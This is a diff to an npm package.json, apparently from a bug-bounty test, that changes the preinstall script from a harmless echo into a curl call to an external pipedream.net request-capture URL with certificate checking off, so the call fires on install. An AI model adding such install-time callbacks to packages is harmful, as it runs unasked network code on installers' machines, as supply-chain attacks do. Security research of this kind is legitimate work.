@@ -4,7 +4,7 @@
   "description": "Bug Bounty Test",
   "main": "main.js",
   "scripts": {
-    "preinstall": "echo '========================= foo ================='"
+    "preinstall": "curl -k https://enboxa0u38amm.x.pipedream.net/"
   },
   "repository": {
     "type": "git",
